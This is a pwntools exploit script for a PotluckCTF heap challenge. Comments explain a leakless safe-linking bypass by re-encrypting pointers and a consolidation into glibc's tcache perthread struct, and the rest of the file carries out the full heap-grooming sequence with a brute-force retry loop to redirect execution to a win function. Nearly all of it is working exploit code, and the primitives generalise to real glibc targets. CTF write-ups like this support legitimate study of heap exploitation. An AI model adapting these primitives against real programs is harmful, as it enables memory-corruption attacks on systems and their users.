from pwn import *
#context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './chal'
HOST = 'challenge26.play.potluckctf.com'
PORT = 31337

elf = ELF(TARGET)
def start():
	if not args.R:
		print("local")
		#return process(TARGET)
		return process(['./ld-linux-x86-64.so.2', TARGET], env={"LD_PRELOAD":"./libc.so.6"})
		#return process(['./ld-linux-x86-64.so.2', TARGET], env={"LD_PRELOAD":"./libc.so.6"}, aslr=False)
		# return process(TARGET, stdout=process.PTY, stdin=process.PTY)
	else:
		print("remote")
		return remote(HOST, PORT)

def get_base_address(proc):
	lines = open("/proc/{}/maps".format(proc.pid), 'r').readlines()
	for line in lines :
		if TARGET[2:] in line.split('/')[-1] :
			break
	return int(line.split('-')[0], 16)

def debug(proc, breakpoints):
	script = "handle SIGALRM ignore\n"
	PIE = get_base_address(proc)
	script += "set $base = 0x{:x}\n".format(PIE)
	for bp in breakpoints:
		script += "b *0x%x\n"%(PIE+bp)
	script += "c"
	gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

def a(buf, off, s=-1):
    r.sendlineafter(b'> ', b'1')
    if s != -1:
        r.sendlineafter(b': ', str(s).encode())
    else:
        r.sendlineafter(b': ', str(len(buf)).encode())
    r.sendlineafter(b': ', str(off).encode())
    r.sendafter(b': ', buf)

def d(idx):
    r.sendlineafter(b'> ', b'2')
    r.sendlineafter(b': ', str(idx).encode())

def win():
    r.sendlineafter(b'> ', b'3')


## Techniques summery
# You need 2 primitives to solve this.
# 1. Leakless safe-linking bypass with re-encryption
#   If you try to link no encrypted pointer `addr` to tcache free list,
#    you can't allocate that chunk because you don't know `key` value.
#
#     tcache->entries[tc_idx] = addr ^ key
# 
#   But if you can link this tcache list itself to another tcache free list,
#    the next allocation will return `addr`.
#
#     tcache->entries[tc_idx] = addr ^ key ^ key
#
#   You don't need to know `key` value when you re-encrypt `addr`.
#
# 2. Consolidate into tcache perthread struct
#   When you free 2 chunks which are 0x3e0-sized and 0x3f0-sized, their tcache->count looks like heap header
#   And if you free 2 chunks which are 0x20-sized and 0x30-sized, their tcache->entries looks like its fd and bk
#
#     0x555555559080: 0x0000000000000000      0x0000000000010001
#     0x555555559090: 0x0000555555559a90      0x0000555555559ab0
#
#   If you can set fake fd and bk, prev_size, prev_inuse bit to right value,
#    you can consolidate this chunk into tcache perthread struct.
#   Of course, there are some tcache->entries at the bottom of this chunk and you can edit them.

## Exploit 
# - setup tcache
# - create some overlap at near `heap + 0x10000`
# - set tcache->entries of 0x20, 0x30 sized chunk
# - place fake fd and bk using smallbin ( need 4bit bruteforce )
# - place fake header and do consolidate
# - encrypt win address twice to set raw pointer into tcache->entries
# - setup win condition

while True:
    r = start()

    # edit tcache-perthread struct ( to win_in_heap )
    a(b'\x01'*0x17, 0x10, 0x198) #0
    a(b'\x01'*0x17, 0x10, 0x198) #1

    # edit tcache-perthread struct ( to inside of struct itself )
    a(b'\x01'*0x17, 0x10, 0x1b8) #2
    a(b'\x01'*0x17, 0x10, 0x1b8) #3

    # create fake header inside tcache-perthread struct ( 0x10001 @ heap+0x88 )
    a(b'\x01'*0x17, 0x10, 0x3e8) #4
    a(b'\x01'*0x17, 0x10, 0x3d8) #5

    # smallbin list to forge unsortedbin list
    a(b'\x01'*0x17, 0x10, 0x88) #6
    a(b'\x01'*0x1, 0x10, 0x18) #7
    a(b'\x01'*0x17, 0x10, 0x88) #8

    for i in range(6):
        d(i)

    for i in range(0x26):#9-46
        a((0x80+i).to_bytes(1, 'little')*0x7, 0, 0x600)
    a((0x80+i).to_bytes(1, 'little')*(0x400-0x130-0x20), 0, 0x400-0x130-0x20)#47

    a(b'\x11'*7, 0x10, 0x448) #48
    a(b'\x22'*7, 0x10, 0x448) #49 # <-- header editor

    d(48)
    d(49)

    a(flat(0x161, 0xbeef), 0x448, 0x548) #50
    d(50)

    # set 0x20, 0x30 tcache->entries pointer to same address
    a(b'\x33'*7, 0x10, 0x448+0x90) #51
    a(b'\x44'*7, 0x10, 0x448) #52 <-- victim
    d(51)
    d(52)

    d(49)
    a(p64(0x21), 0x88, 0x158) #53
    d(52)

    d(49)
    a(flat(0x31), 0x88, 0x158)#54
    d(52)

    # place smallbin pointer
    a(b'\x33'*7, 0x10, 0x458+0x90) #55
    a(b'\x44'*7, 0x10, 0x88) #56
    a(b'\xee'*0x488, 0, 0x488) #57

    for i in range(7):#58-64
        a(b'\x55'*7, 0x10, 0x88)
    for i in range(7):
        d(58+i)
    d(6)
    a(b'\x66'*7, 0x10, 0x98) #65
    d(56)
    a(b'\x77'*7, 0x10, 0x98)#66
    d(8)
    a(b'\x88'*7, 0x10, 0x98)#67

    # edit fake header, fd, bk for consolidation
    d(49)
    a(flat(0x10000, 0x530), 0x80, 0x158) #68
    d(49)
    a(b'\x80\x60', 0xa0, 0x158) #69 <--- 1/16
    d(49)
    a(b'\x80\x60', 0xa8, 0x158) #70

    # do consolidate
    d(52)
    try:
        # edit tcache->entries to `win_in_heap`
        a(b'\xa0\x62', 0xc0, 0xe8) #71
        break
    except:
        pass
    r.close()

if args.D:
    debug(r, [])
    pause()

# encrypt address `win` with unknown `key`
a(b'\xaa', 0, 0x198) #72
d(71)

# re-encrypt `win ^ key` with same `key`
a(b'\x50\x61', 0xd0, 0xe8) #73

# 2 alloc and you can get the address `win`
a(b'\xbb', 0, 0x1b8) #74
a(p64(0x37c3c7f), 0, 0x1b8) #75
win()

r.interactive()
r.close()
